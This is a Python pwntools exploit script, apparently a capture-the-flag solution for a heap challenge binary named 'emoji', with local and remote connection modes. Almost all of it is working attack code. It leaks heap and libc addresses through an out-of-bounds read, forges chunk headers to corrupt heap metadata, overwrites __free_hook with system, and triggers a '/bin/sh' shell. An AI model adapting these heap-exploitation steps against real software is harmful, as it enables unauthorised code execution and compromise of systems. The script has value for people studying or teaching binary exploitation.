from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './emoji'
HOST = '193.57.159.27'
PORT = 57235
HOST = '172.17.0.2'
PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def a(title, emoji):
	r.sendlineafter('> ', '1')
	r.sendafter(': ', title)
	r.sendafter(': ', emoji)
def s(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))
def d(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
def gc():
	r.sendlineafter('> ', '4')


for i in range(10):
	a(p64(0x21) * (0x78/8), '\xffABC')
s(0)
r.recvuntil('\xffABC')
leak = u32(r.recv(4))
heap = leak - 0x12d0
dbg('heap')

for i in range(1, 9):
	d(i)
gc()

target = heap + 0x1850
a('1111', '\xff222'+p16(target & 0xffff))
s(1)
r.recvuntil('Title: ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x1ebbe0
system = base + 0x55410
fh = base + 0x1eeb28

a(p64(0x091)*(0x78/8), '\xff000')
a(p64(0x091)*(0x78/8), '\xff111'+p16((heap+0x1690) & 0xffff))
a(p64(0x291)*(0x78/8), '\xff222')

d(2)
d(3)
gc()
payload = ''
payload += 'a'*0x38
payload += p64(0x21)
payload += 'AAAA'
payload += flat(heap+0x1850)
payload += 'BBBB'
payload += flat(0, 0x91, fh-8)

a(payload, '\xff333')
for i in range(2):
	a("/bin/sh\x00"+p64(system), '\xff444')
d(3)
gc()


r.interactive()
r.close()
